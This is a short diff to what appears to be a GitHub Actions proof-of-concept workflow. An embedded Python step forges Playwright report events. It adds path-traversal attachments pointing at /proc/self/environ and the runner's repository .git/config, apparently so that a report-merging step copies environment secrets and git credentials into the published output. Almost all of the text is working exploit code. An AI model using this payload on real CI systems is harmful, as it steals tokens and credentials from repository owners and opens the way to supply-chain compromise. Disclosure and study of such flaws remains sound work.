@@ -43,11 +43,18 @@ jobs:
                           continue
                       ev = json.loads(line)
                       if ev.get('method') == 'onTestEnd':
-                          ev['params']['result']['attachments'] = [{
-                              'name': 'leak.txt',
-                              'contentType': 'text/plain',
-                              'path': '../../../../../../../../proc/self/environ',
-                          }]
+                          ev['params']['result']['attachments'] = [
+                              {
+                                  'name': 'environ.txt',
+                                  'contentType': 'text/plain',
+                                  'path': '../../../../../../../../proc/self/environ',
+                              },
+                              {
+                                  'name': 'gitconfig.txt',
+                                  'contentType': 'text/plain',
+                                  'path': '../../../../../../../../home/runner/work/gab-poc-pw-merge-report/gab-poc-pw-merge-report/.git/config',
+                              },
+                          ]
                       lines.append(json.dumps(ev))
                   data = ('\n'.join(lines) + '\n').encode()
               out.append((name, data))
